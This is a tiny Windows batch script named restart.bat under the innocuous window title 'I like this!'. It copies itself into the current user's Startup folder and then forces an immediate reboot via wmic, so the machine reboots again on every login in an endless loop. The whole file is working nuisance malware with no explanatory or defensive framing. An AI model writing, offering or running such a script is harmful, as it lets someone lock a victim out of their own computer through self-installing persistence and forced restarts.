@echo off
title I like this!
copy restart.bat %appdata%\Microsoft\Windows\Start Menu\Programs\Startup\restart.bat
wmic os where primary=true reboot
